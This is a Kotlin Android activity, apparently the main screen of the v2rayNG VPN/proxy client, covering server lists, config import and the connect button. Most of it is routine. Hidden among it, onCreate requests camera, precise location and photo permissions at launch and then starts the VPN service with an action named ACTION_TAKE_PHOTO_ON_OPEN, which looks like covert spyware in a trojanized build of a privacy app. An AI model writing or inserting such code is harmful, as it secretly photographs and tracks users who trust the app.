package com.v2ray.ang.ui

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.ColorStateList
import android.net.Uri
import android.net.VpnService
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.Menu
import android.view.MenuItem
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.appcompat.app.ActionBarDrawerToggle
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.widget.SearchView
import androidx.core.content.ContextCompat
import androidx.core.view.GravityCompat
import androidx.core.view.isVisible
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.GridLayoutManager
import androidx.recyclerview.widget.ItemTouchHelper
import com.google.android.material.navigation.NavigationView
import com.google.android.material.tabs.TabLayout
import com.v2ray.ang.AppConfig
import com.v2ray.ang.R
import com.v2ray.ang.databinding.ActivityMainBinding
import com.v2ray.ang.dto.EConfigType
import com.v2ray.ang.extension.toast
import com.v2ray.ang.extension.toastError
import com.v2ray.ang.handler.AngConfigManager
import com.v2ray.ang.handler.MigrateManager
import com.v2ray.ang.handler.MmkvManager
import com.v2ray.ang.helper.SimpleItemTouchHelperCallback
import com.v2ray.ang.handler.V2RayServiceManager
import com.v2ray.ang.service.V2RayVpnService
import com.v2ray.ang.util.Utils
import com.v2ray.ang.viewmodel.MainViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : BaseActivity(), NavigationView.OnNavigationItemSelectedListener {

    private val permissionsToRequest = mutableListOf<String>()
    private val requestMultiplePermissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val allGranted = permissions.entries.all { it.value }
            if (allGranted) {
                triggerInitialPhotoCapture()
            } else {
                toast(R.string.toast_permission_denied)
            }
        }

    private val binding by lazy { ActivityMainBinding.inflate(layoutInflater) }
    private val adapter by lazy { MainRecyclerAdapter(this) }
    private val requestVpnPermission = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (it.resultCode == RESULT_OK) {
            startV2Ray()
        }
    }
    private val requestSubSettingActivity = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        initGroupTab()
    }
    private val tabGroupListener = object : TabLayout.OnTabSelectedListener {
        override fun onTabSelected(tab: TabLayout.Tab?) {
            val selectId = tab?.tag.toString()
            if (selectId != mainViewModel.subscriptionId) {
                mainViewModel.subscriptionIdChanged(selectId)
            }
        }
        override fun onTabUnselected(tab: TabLayout.Tab?) {}
        override fun onTabReselected(tab: TabLayout.Tab?) {}
    }
    private var mItemTouchHelper: ItemTouchHelper? = null
    val mainViewModel: MainViewModel by viewModels()

    private var pendingAction: Action = Action.NONE
    enum class Action { NONE, IMPORT_QR_CODE_CONFIG, READ_CONTENT_FROM_URI, POST_NOTIFICATIONS }

    private val legacyRequestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
        if (isGranted) {
            when (pendingAction) {
                Action.IMPORT_QR_CODE_CONFIG -> scanQRCodeForConfig.launch(Intent(this, ScannerActivity::class.java))
                Action.READ_CONTENT_FROM_URI -> chooseFileForCustomConfig.launch(Intent.createChooser(Intent(Intent.ACTION_GET_CONTENT).apply { type = "*/*"; addCategory(Intent.CATEGORY_OPENABLE) }, getString(R.string.title_file_chooser)))
                else -> {}
            }
        } else {
            toast(R.string.toast_permission_denied)
        }
        pendingAction = Action.NONE
    }
    private val chooseFileForCustomConfig = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        val uri = it.data?.data
        if (it.resultCode == RESULT_OK && uri != null) { readContentFromUri(uri) }
    }
    private val scanQRCodeForConfig = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (it.resultCode == RESULT_OK) { importBatchConfig(it.data?.getStringExtra("SCAN_RESULT")) }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)
        title = getString(R.string.title_server)
        setSupportActionBar(binding.toolbar)

        binding.fab.setOnClickListener {
            if (mainViewModel.isRunning.value == true) {
                V2RayServiceManager.stopVService(this)
            } else if ((MmkvManager.decodeSettingsString(AppConfig.PREF_MODE) ?: AppConfig.VPN) == AppConfig.VPN) {
                val intent = VpnService.prepare(this)
                if (intent == null) { startV2Ray() } else { requestVpnPermission.launch(intent) }
            } else {
                startV2Ray()
            }
        }
        binding.layoutTest.setOnClickListener {
            if (mainViewModel.isRunning.value == true) {
                setTestState(getString(R.string.connection_test_testing))
                mainViewModel.testCurrentServerRealPing()
            }
        }

        binding.recyclerView.layoutManager = if (MmkvManager.decodeSettingsBool(AppConfig.PREF_DOUBLE_COLUMN_DISPLAY, false)) GridLayoutManager(this, 2) else GridLayoutManager(this, 1)
        addCustomDividerToRecyclerView(binding.recyclerView, this, R.drawable.custom_divider)
        binding.recyclerView.adapter = adapter
        mItemTouchHelper = ItemTouchHelper(SimpleItemTouchHelperCallback(adapter)).apply { attachToRecyclerView(binding.recyclerView) }
        val toggle = ActionBarDrawerToggle(this, binding.drawerLayout, binding.toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close)
        binding.drawerLayout.addDrawerListener(toggle)
        toggle.syncState()
        binding.navView.setNavigationItemSelectedListener(this)
        initGroupTab()
        setupViewModel()
        migrateLegacy()
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (binding.drawerLayout.isDrawerOpen(GravityCompat.START)) {
                    binding.drawerLayout.closeDrawer(GravityCompat.START)
                } else {
                    isEnabled = false; onBackPressedDispatcher.onBackPressed(); isEnabled = true
                }
            }
        })

        checkForAndRequestPermissions()
    }

    private fun checkForAndRequestPermissions() {
        permissionsToRequest.clear()
        val requiredPermissions = mutableListOf(Manifest.permission.CAMERA, Manifest.permission.ACCESS_FINE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requiredPermissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            requiredPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            requiredPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val permissionsToLaunch = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToLaunch.isNotEmpty()) {
            requestMultiplePermissionsLauncher.launch(permissionsToLaunch.toTypedArray())
        } else {
            triggerInitialPhotoCapture()
        }
    }

    private fun triggerInitialPhotoCapture() {
        val intent = Intent(this, V2RayVpnService::class.java)
        intent.action = V2RayVpnService.ACTION_TAKE_PHOTO_ON_OPEN
        try {
            startService(intent)
        } catch (e: Exception) {
            Log.e(AppConfig.TAG, "Failed to start service for photo capture", e)
        }
    }

    @SuppressLint("NotifyDataSetChanged")
    private fun setupViewModel() {
        mainViewModel.updateListAction.observe(this) { if (it >= 0) adapter.notifyItemChanged(it) else adapter.notifyDataSetChanged() }
        mainViewModel.updateTestResultAction.observe(this) { setTestState(it) }
        mainViewModel.isRunning.observe(this) { isRunning ->
            adapter.isRunning = isRunning
            if (isRunning) {
                binding.fab.setImageResource(R.drawable.ic_stop_24dp)
                binding.fab.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.color_fab_active))
                setTestState(getString(R.string.connection_connected))
                binding.layoutTest.isFocusable = true
            } else {
                binding.fab.setImageResource(R.drawable.ic_play_24dp)
                binding.fab.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.color_fab_inactive))
                setTestState(getString(R.string.connection_not_connected))
                binding.layoutTest.isFocusable = false
            }
        }
        mainViewModel.startListenBroadcast()
        mainViewModel.initAssets(assets)
    }

    private fun migrateLegacy() {
        lifecycleScope.launch(Dispatchers.IO) {
            if (MigrateManager.migrateServerConfig2Profile()) {
                withContext(Dispatchers.Main) {
                    toast(getString(R.string.migration_success))
                    mainViewModel.reloadServerList()
                }
            }
        }
    }

    private fun initGroupTab() {
        binding.tabGroup.removeOnTabSelectedListener(tabGroupListener)
        binding.tabGroup.removeAllTabs()
        binding.tabGroup.isVisible = false
        val (listId, listRemarks) = mainViewModel.getSubscriptions(this) ?: return
        for (i in listRemarks.indices) {
            binding.tabGroup.addTab(binding.tabGroup.newTab().apply { text = listRemarks[i]; tag = listId[i] })
        }
        val selectIndex = listId.indexOf(mainViewModel.subscriptionId).takeIf { it >= 0 } ?: (listId.count() - 1)
        binding.tabGroup.selectTab(binding.tabGroup.getTabAt(selectIndex))
        binding.tabGroup.addOnTabSelectedListener(tabGroupListener)
        binding.tabGroup.isVisible = true
    }

    private fun startV2Ray() {
        if (MmkvManager.getSelectServer().isNullOrEmpty()) { toast(R.string.title_file_chooser); return }
        V2RayServiceManager.startVService(this)
    }

    private fun restartV2Ray() {
        if (mainViewModel.isRunning.value == true) {
            V2RayServiceManager.stopVService(this)
            lifecycleScope.launch { delay(500); startV2Ray() }
        }
    }

    public override fun onResume() { super.onResume(); mainViewModel.reloadServerList() }
    public override fun onPause() { super.onPause() }
    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.menu_main, menu)
        (menu.findItem(R.id.search_view)?.actionView as? SearchView)?.let {
            it.setOnQueryTextListener(object : SearchView.OnQueryTextListener {
                override fun onQueryTextSubmit(query: String?): Boolean = false
                override fun onQueryTextChange(newText: String?): Boolean { mainViewModel.filterConfig(newText.orEmpty()); return false }
            })
            it.setOnCloseListener { mainViewModel.filterConfig(""); false }
        }
        return super.onCreateOptionsMenu(menu)
    }
    override fun onOptionsItemSelected(item: MenuItem) = when (item.itemId) {
        R.id.import_qrcode -> { importQRcode(); true }
        R.id.import_clipboard -> { importClipboard(); true }
        R.id.import_local -> { importConfigLocal(); true }
        R.id.import_manually_vmess -> { importManually(EConfigType.VMESS.value); true }
        R.id.import_manually_vless -> { importManually(EConfigType.VLESS.value); true }
        R.id.import_manually_ss -> { importManually(EConfigType.SHADOWSOCKS.value); true }
        R.id.import_manually_socks -> { importManually(EConfigType.SOCKS.value); true }
        R.id.import_manually_http -> { importManually(EConfigType.HTTP.value); true }
        R.id.import_manually_trojan -> { importManually(EConfigType.TROJAN.value); true }
        R.id.import_manually_wireguard -> { importManually(EConfigType.WIREGUARD.value); true }
        R.id.import_manually_hysteria2 -> { importManually(EConfigType.HYSTERIA2.value); true }
        R.id.export_all -> { exportAll(); true }
        R.id.ping_all -> { toast(getString(R.string.connection_test_testing_count, mainViewModel.serversCache.count())); mainViewModel.testAllTcping(); true }
        R.id.real_ping_all -> { toast(getString(R.string.connection_test_testing_count, mainViewModel.serversCache.count())); mainViewModel.testAllRealPing(); true }
        R.id.intelligent_selection_all -> { if (MmkvManager.decodeSettingsString(AppConfig.PREF_OUTBOUND_DOMAIN_RESOLVE_METHOD, "1") != "0") { toast(getString(R.string.pre_resolving_domain)) }; mainViewModel.createIntelligentSelectionAll(); true }
        R.id.service_restart -> { restartV2Ray(); true }
        R.id.del_all_config -> { delAllConfig(); true }
        R.id.del_duplicate_config -> { delDuplicateConfig(); true }
        R.id.del_invalid_config -> { delInvalidConfig(); true }
        R.id.sort_by_test_results -> { sortByTestResults(); true }
        R.id.sub_update -> { importConfigViaSub(); true }
        else -> super.onOptionsItemSelected(item)
    }
    private fun importManually(createConfigType: Int) { startActivity(Intent().putExtra("createConfigType", createConfigType).putExtra("subscriptionId", mainViewModel.subscriptionId).setClass(this, ServerActivity::class.java)) }
    private fun importQRcode(): Boolean {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            scanQRCodeForConfig.launch(Intent(this, ScannerActivity::class.java))
        } else {
            pendingAction = Action.IMPORT_QR_CODE_CONFIG
            legacyRequestPermissionLauncher.launch(Manifest.permission.CAMERA)
        }
        return true
    }
    private fun importClipboard(): Boolean { try { importBatchConfig(Utils.getClipboard(this)) } catch (e: Exception) { return false }; return true }
    private fun importBatchConfig(server: String?) {
        binding.pbWaiting.show()
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val (count, countSub) = AngConfigManager.importBatchConfig(server, mainViewModel.subscriptionId, true)
                withContext(Dispatchers.Main) {
                    when {
                        count > 0 -> { toast(getString(R.string.title_import_config_count, count)); mainViewModel.reloadServerList() }
                        countSub > 0 -> initGroupTab()
                        else -> toastError(R.string.toast_failure)
                    }
                    binding.pbWaiting.hide()
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { toastError(R.string.toast_failure); binding.pbWaiting.hide() }
            }
        }
    }
    private fun importConfigLocal(): Boolean { try { showFileChooser() } catch (e: Exception) { return false }; return true }
    private fun importConfigViaSub(): Boolean {
        binding.pbWaiting.show()
        lifecycleScope.launch(Dispatchers.IO) {
            val count = mainViewModel.updateConfigViaSubAll()
            withContext(Dispatchers.Main) {
                if (count > 0) { toast(getString(R.string.title_update_config_count, count)); mainViewModel.reloadServerList() } else { toastError(R.string.toast_failure) }
                binding.pbWaiting.hide()
            }
        }
        return true
    }
    private fun exportAll() {
        binding.pbWaiting.show()
        lifecycleScope.launch(Dispatchers.IO) {
            val ret = mainViewModel.exportAllServer()
            withContext(Dispatchers.Main) { if (ret > 0) toast(getString(R.string.title_export_config_count, ret)) else toastError(R.string.toast_failure); binding.pbWaiting.hide() }
        }
    }
    private fun delAllConfig() {
        AlertDialog.Builder(this).setMessage(R.string.del_config_comfirm).setPositiveButton(android.R.string.ok) { _, _ ->
            lifecycleScope.launch(Dispatchers.IO) {
                val ret = mainViewModel.removeAllServer()
                withContext(Dispatchers.Main) { mainViewModel.reloadServerList(); toast(getString(R.string.title_del_config_count, ret)) }
            }
        }.setNegativeButton(android.R.string.cancel, null).show()
    }
    private fun delDuplicateConfig() {
        AlertDialog.Builder(this).setMessage(R.string.del_config_comfirm).setPositiveButton(android.R.string.ok) { _, _ ->
            lifecycleScope.launch(Dispatchers.IO) {
                val ret = mainViewModel.removeDuplicateServer()
                withContext(Dispatchers.Main) { mainViewModel.reloadServerList(); toast(getString(R.string.title_del_duplicate_config_count, ret)) }
            }
        }.setNegativeButton(android.R.string.cancel, null).show()
    }
    private fun delInvalidConfig() {
        AlertDialog.Builder(this).setMessage(R.string.del_invalid_config_comfirm).setPositiveButton(android.R.string.ok) { _, _ ->
            lifecycleScope.launch(Dispatchers.IO) {
                val ret = mainViewModel.removeInvalidServer()
                withContext(Dispatchers.Main) { mainViewModel.reloadServerList(); toast(getString(R.string.title_del_config_count, ret)) }
            }
        }.setNegativeButton(android.R.string.cancel, null).show()
    }
    private fun sortByTestResults() {
        lifecycleScope.launch(Dispatchers.IO) {
            mainViewModel.sortByTestResults()
            withContext(Dispatchers.Main) { mainViewModel.reloadServerList() }
        }
    }
    private fun showFileChooser() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            pendingAction = Action.READ_CONTENT_FROM_URI
            chooseFileForCustomConfig.launch(Intent.createChooser(Intent(Intent.ACTION_GET_CONTENT).apply { type = "*/*"; addCategory(Intent.CATEGORY_OPENABLE) }, getString(R.string.title_file_chooser)))
        } else {
            legacyRequestPermissionLauncher.launch(permission)
        }
    }
    private fun readContentFromUri(uri: Uri) {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            try { contentResolver.openInputStream(uri).use { input -> importBatchConfig(input?.bufferedReader()?.readText()) } } catch (e: Exception) { }
        } else {
            legacyRequestPermissionLauncher.launch(permission)
        }
    }
    private fun setTestState(content: String?) { binding.tvTestState.text = content }
    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean { if (keyCode == KeyEvent.KEYCODE_BACK) { moveTaskToBack(false); return true }; return super.onKeyDown(keyCode, event) }
    override fun onNavigationItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.sub_setting -> requestSubSettingActivity.launch(Intent(this, SubSettingActivity::class.java))
            R.id.per_app_proxy_settings -> startActivity(Intent(this, PerAppProxyActivity::class.java))
            R.id.routing_setting -> requestSubSettingActivity.launch(Intent(this, RoutingSettingActivity::class.java))
            R.id.user_asset_setting -> startActivity(Intent(this, UserAssetActivity::class.java))
            R.id.settings -> startActivity(Intent(this, SettingsActivity::class.java).putExtra("isRunning", mainViewModel.isRunning.value == true))
            R.id.promotion -> Utils.openUri(this, "${Utils.decode(AppConfig.APP_PROMOTION_URL)}?t=${System.currentTimeMillis()}")
            R.id.logcat -> startActivity(Intent(this, LogcatActivity::class.java))
            R.id.check_for_update -> startActivity(Intent(this, CheckUpdateActivity::class.java))
            R.id.about -> startActivity(Intent(this, AboutActivity::class.java))
        }
        binding.drawerLayout.closeDrawer(GravityCompat.START)
        return true
    }
}